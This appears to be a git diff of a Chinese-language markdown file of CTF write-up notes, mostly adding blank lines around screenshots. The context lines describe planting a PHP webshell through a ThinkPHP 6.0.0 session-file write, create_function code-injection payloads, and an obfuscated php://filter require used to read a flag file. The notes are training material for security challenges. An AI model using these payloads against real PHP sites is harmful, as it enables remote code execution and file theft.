@@ -58,8 +58,12 @@ tags: note
 
 
 
-### JustEscape      
-![01.png](https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png)      
+### JustEscape   
+
+   
+![01.png](https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png) 
+
+     
 
 下面两个demo     
 
@@ -128,25 +132,47 @@ payload:
 输入个不存在的路径     
 报错：       
 
+
+
 ![01.png](https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png)     
+
+
+
 
 [Think PHP V6.0.0任意文件操作漏洞](https://paper.seebug.org/1114/)       
 
+
+
 ![02.png](https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png)    
+
+
+
 
 32位的PHPSESSID改成一个32位的PHP文件名  
     
+
+
 ![03.png](https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png)      
 
 
 搜索里面填入一句话      
 
+
+
 ![04.png](https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png)       
+
+
+
 就会被存放到之前写的文件里面  
 访问`http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php`     
 最后的文件名是`sess_`+刚才的32位    
 
-![05.png](https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png)      
+
+
+![05.png](https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png)     
+
+
+ 
 
 还要绕过`disable_function`   
 和之前那道题一样        
@@ -303,9 +329,14 @@ URL编码
 
 $code和$arg可以通过`extract($_GET["flag"]);`传入     
 
-`creat_function()`函数       
+`creat_function()`函数    
+
+   
 
 ![01.png](https://img11.360buyimg.com/ddimg/jfs/t1/163792/4/20511/6856/6082e575Ef04fe2e5/514edbaaa03f01e8.png)      
+
+
+
 
 	$func=creat_function('$a,$b','return $a*$b;');
 	func()  就相当于    
@@ -331,15 +362,28 @@ flag[arg]=;}a();//
 
 `get_defined_vars()`函数会以数组形式返回所有变量和值        
 `flag[code]=create_function&flag[arg]=;}var_dump(get_defined_vars());//`
-![02.png](https://img11.360buyimg.com/ddimg/jfs/t1/163461/36/20309/34836/6082eb4cE5ed6382e/e08bdbff0aa587d8.png)         
+
+
+![02.png](https://img11.360buyimg.com/ddimg/jfs/t1/163461/36/20309/34836/6082eb4cE5ed6382e/e08bdbff0aa587d8.png)      
+
+
+   
 `require`读取文件      
-`flag[arg]=;}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//`    
+`flag[arg]=;}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//`   
+
+ 
 ![03.png](https://img13.360buyimg.com/ddimg/jfs/t1/183003/35/675/45335/6082ec64E4b186153/4b8afb83d9a49b77.png)     
+
+
 这个是假的     
 要用伪协议，URL取反    
 
-`;}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//`      
+`;}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//`    
+
+
+  
 ![04.png](https://img12.360buyimg.com/ddimg/jfs/t1/173695/38/6129/110660/6082ef53Eed0617a1/19b0d876457d7346.png)       
+
 
 
 
@@ -347,9 +391,13 @@ flag[arg]=;}a();//
 [MORE](https://www.gem-love.com/ctf/770.html)       
 
 
-### SQLi      
+### SQLi   
+
+   
 
 ![01.png](https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg)      
+
+
 
 
 `robots.txt`     
